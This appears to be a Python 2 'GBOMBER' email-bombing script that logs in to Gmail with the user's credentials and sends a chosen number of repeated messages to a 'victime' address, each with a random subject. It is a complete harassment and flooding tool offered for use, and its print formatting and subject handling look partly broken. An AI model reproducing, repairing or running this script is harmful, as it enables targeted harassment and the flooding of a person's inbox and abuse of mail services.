# -*- coding: utf-8 -*-
# =========================================================================================================================================
import os
import random
import smtplib
import sys
import getpass
import time
# ======================= HEADING ================================================================================================
os.system('clear')
print ('''
  #GBOMBER TOOL
                             AUTHOR:\033[93m CNH4CK3R\033[97m
''')
print(" ")
####################   USER INFORMATION #####################
user = raw_input('\033[94m[?] \033[97mYOUR \033[92mGMAIL\033[97m :\033[93m ')
passworde = getpass.getpass('\033[94m[?]\033[97m YOUR \033[91mPASSWORD\033[97m :\033[93m ')
print(" ")
victime = raw_input('\033[94m[?]\033[97m THE VICTIME \033[91mEMAIL\033[97m : \033[93m')
message = raw_input('\033[94m[?]\033[97m YOUR \033[92mMESSAGE\033[97m : \033[93m')
print(" ")
hani = input('\033[94m[?] \033[97mNUMBER OF \033[92mSENT\033[97m : \033[93m')
print(" ")
print("\033[94m[*] \033[97mSENDING : ")
############################### SMTP_SERVER INFO ##################
smtp_server = 'smtp.gmail.com'
port = 587

##########################  LOGIN ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passworde)
###################### SENDING #########################################
    for i in range(1, hani+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user,victime,msg)
        print ("\033[94m[✔]\033[97m EMAIL SUCCESSFULLY\033[92m SENT\033[97m  :\033[93m %i") % i
        sys.stdout.flush()
    server.quit()
    print ('\033[93m[✔]\033[97m ALL \033[97mMESSAGE WAS\033[92m SUCCESSFULLY SENT\033[97m ')
    print ('\033[93m[✔]\033[97m THANKS FOR USING \033[97mTOOL\033[92m #GBOMBER\033[97m ')
    print ('\033[93m[✔]\033[97m WARM \033[97mREGARDS\033[92m CNH4CK3R\033[97m ')
    
except KeyboardInterrupt:
    print ('[✘] CANCELED')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m[✘] \033[91mERROR \033[97m:")
    print ('\033[94m[✘] \033[97mTHE \033[93mUSERNAME \033[97mOR \033[93mPASSWORD \033[97mYOU ENTERED IS INCORRECT.')
    print ("\033[94m[!] \033[97mCHECK IF THE OPTIONS OF 'APPLICATIONS ARE LESS SECURE' IS ENABLED\nCHECK IT https://myaccount.google.com/lesssecureapps")
    sys.exit()
